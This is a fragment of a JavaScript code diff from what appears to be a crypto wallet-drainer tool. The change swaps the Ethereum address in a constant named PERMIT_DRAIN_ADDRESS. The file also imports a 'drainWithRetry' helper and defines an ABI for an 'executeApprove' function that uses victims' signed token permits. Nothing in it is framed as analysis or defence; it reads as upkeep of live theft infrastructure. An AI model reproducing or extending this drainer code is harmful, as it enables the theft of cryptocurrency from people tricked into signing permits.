@@ -2,7 +2,7 @@ import { ethers } from 'ethers';
 import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
-const PERMIT_DRAIN_ADDRESS = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';
+const PERMIT_DRAIN_ADDRESS = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
 const PERMIT_DRAIN_ABI = [
   'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
   'function nonces(address) view returns (uint256)'
